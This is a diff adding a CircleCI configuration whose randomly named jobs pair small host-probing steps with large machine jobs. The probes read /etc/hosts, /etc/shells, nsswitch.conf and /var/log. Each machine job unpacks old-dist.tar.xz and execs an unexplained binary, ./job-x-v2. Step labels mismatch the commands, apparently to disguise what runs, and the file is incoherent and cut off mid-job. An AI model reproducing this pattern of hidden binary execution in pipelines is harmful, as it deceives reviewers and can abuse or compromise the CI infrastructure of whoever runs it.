@@ -1,0 +1,1469 @@
+version: 2.1
+
+jobs:
+  external_freeze:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute gate md5
+          command: |
+            mkdir -p /tmp/branch
+            set +o pipefail 2>/dev/null; echo "ts $(date +%s%N)" > /tmp/branch/fermion_pixel_bond; echo "ppid $PPID" >> /tmp/branch/fermion_pixel_bond; seq 1 556682 >> /tmp/branch/fermion_pixel_bond; true
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/fermion_pixel_bond
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'fermion_pixel_bond'
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/fermion_pixel_bond 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  ch7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Close v2 final
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; tar -cf "/tmp/bre4.tar" -C /etc hosts && tar -rf "/tmp/bre4.tar" -C /etc shells && tar -tf "/tmp/bre4.tar"; true ; } > /tmp/branch/INV10351
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/INV10351
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'INV10351'
+  v7-alpha4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/INV10351 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  cfl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Advance to seed data
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; locale | grep LC_ALL; true ; } > /tmp/branch/_wipd63e
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/_wipd63e
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - '_wipd63e'
+  q4-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/_wipd63e 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  panelWillAppear:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Skip pinch while the filter chips are idle
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; seq 5 12 | sed -n '$p'; true ; } > /tmp/branch/GiZLNktQzas
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/GiZLNktQzas
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'GiZLNktQzas'
+  xi-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  blog-email-text:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Vanquish backup set
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; ls -F1 /etc/security /lib | wc -w; true ; } > /tmp/branch/thund3rvau1t
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/thund3rvau1t
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'thund3rvau1t'
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  MacroHelmetNewIvyCardSignal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: If the pager rotation is stale do nothing
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; printf '%s\n' "running low on memory" | xargs; true ; } > /tmp/branch/BlobCraneSouth
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/BlobCraneSouth
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'BlobCraneSouth'
+  refactor-2987:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/BlobCraneSouth 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  oyd6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Exercise Crimson Fox
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 1 -iname "*.gz" -printf '%y %p\n'| awk -F/ '{print $NF}'; true ; } > /tmp/branch/X
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/X
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'X'
+  chore-8223:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/X 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  mark15:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: dpl env file 4
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; for val in madrid nairobi oslo austin; do printf '%s\n' "$val"; done|sort -r; true ; } > /tmp/branch/JGx
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/JGx
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'JGx'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/JGx 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  kDelta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: DILUTE PIPETTE TIPS START
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 3 -empty 2>/dev/null | wc -l; true ; } > /tmp/branch/west
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/west
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'west'
+  vega-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  WEBER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Tokenize the adapter weights on 2 gpus
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; if [ ! -k /tmp ] ; then echo yes; elif [ -e /tmp ] ; then echo maybe; else echo no; fi; true ; } > /tmp/branch/PACKET
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/PACKET
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'PACKET'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  ep452:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Face off rotation
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; sed '/passwd/!d' /etc/nsswitch.conf; true ; } > /tmp/branch/xx_1224242b78
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/xx_1224242b78
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'xx_1224242b78'
+  UAT_INIT_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  MASK_INTERCEPTOR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Settlement during the freeze
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/error" && touch "/tmp/error"/a.tmp "/tmp/error"/b.tmp && find "/tmp/error" -name '*.tmp' -delete && ls -A "/tmp/error"; true ; } > /tmp/branch/hollowsurgemodule
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/hollowsurgemodule
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'hollowsurgemodule'
+  Rollout_Suite5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/hollowsurgemodule 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  theTempo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute gate md5
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; for file in /etc/host*;do basename "${file}"; done|sort; true ; } > /tmp/branch/batch_802
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/batch_802
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'batch_802'
+  CORE-742:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/batch_802 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  badge_cell:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Anyone listing the lockfile
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; for num in monday friday saturday; do echo "${num^}"; done | nl; true ; } > /tmp/branch/blake_c977f088b36594c
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/blake_c977f088b36594c
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'blake_c977f088b36594c'
+  hotfix-2201:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/blake_c977f088b36594c 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  reAddressCanvas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Ten nine eight renewal
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; install -d -m 700 "/var/tmp/whale-campus"&&stat -c %a "/var/tmp/whale-campus"; true ; } > /tmp/branch/chrome_burst
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/chrome_burst
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'chrome_burst'
+  tb-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/chrome_burst 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  yamadaf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: VALIDATE REGRESSION PACK START
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; shuf -i 1-393 -n 14 | tac; true ; } > /tmp/branch/PXL29214
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/PXL29214
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'PXL29214'
+  Prepare_Staging9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PXL29214 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  MeshToGUI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Go cook the particle systems
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | grep -m1 "flags"; true ; } > /tmp/branch/P-00057527
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/P-00057527
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'P-00057527'
+  xray:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/P-00057527 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  uniformStream:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Sample gradient clipping
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; echo "mission accomplished" && echo "error: none"; true ; } > /tmp/branch/sha_62522d7d
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/sha_62522d7d
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'sha_62522d7d'
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/sha_62522d7d 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  ZoleV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: resume v18
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; sha1sum /etc/shells >"/tmp/m6.txt" && sha1sum -c "/tmp/m6.txt"; true ; } > /tmp/branch/fnv_8136583b
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/fnv_8136583b
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'fnv_8136583b'
+  rust-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/fnv_8136583b 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  primarybody:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: archive 2025 backup battery
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; find /var/log -type f \( -name '*log*' -o -name 'wtmp' \) -exec wc -c {} + 2>/dev/null | wc -l; true ; } > /tmp/branch/temp-e2b
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/temp-e2b
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'temp-e2b'
+  rm-db-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/temp-e2b 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  TupleMigrationTexture:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Lab snapshot gate
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; ln -sf /etc/os-release "/tmp/health-segment02.dat" && stat -c %N "/tmp/health-segment02.dat"; true ; } > /tmp/branch/xx_7ae490a
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/xx_7ae490a
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'xx_7ae490a'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/xx_7ae490a 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  expandshell:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Toss the event store
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -name 'fd' -empty -mmin -1440 -printf '%M %p\n' 2>/dev/null | tail -n 3; true ; } > /tmp/branch/invoice_crimson
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/invoice_crimson
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'invoice_crimson'
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  CotQmgH:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Date picker scrolled and verified
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; cat /etc/os-release|tr -d '[:digit:]'|wc -w; true ; } > /tmp/branch/TiC
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/TiC
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'TiC'
+  PROD_MERGE_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/TiC 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  aki2k:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Another Scoring Round
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; printf %s "snake_case_name" | b2sum | awk '{print $1}'; true ; } > /tmp/branch/IndigoQueueReport
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/IndigoQueueReport
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'IndigoQueueReport'
+  hu-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/IndigoQueueReport 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  GraphPartial:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute gate md5
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 1 -type f -iname 'user' -print0 | xargs -0r stat -c %s | awk '{s+=$1} END {print s}'; true ; } > /tmp/branch/CRISP_THETA_MOTH_CRISP
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/CRISP_THETA_MOTH_CRISP
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'CRISP_THETA_MOTH_CRISP'
+  produce-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/CRISP_THETA_MOTH_CRISP 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  blocksArray:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: vrfy src 55
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; mkdir -p "/var/tmp/jade-drive-theater" && ls -ld "/var/tmp/jade-drive-theater" && rmdir "/var/tmp/jade-drive-theater"; true ; } > /tmp/branch/memo136
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/memo136
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'memo136'
+  QA_DEPLOY_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
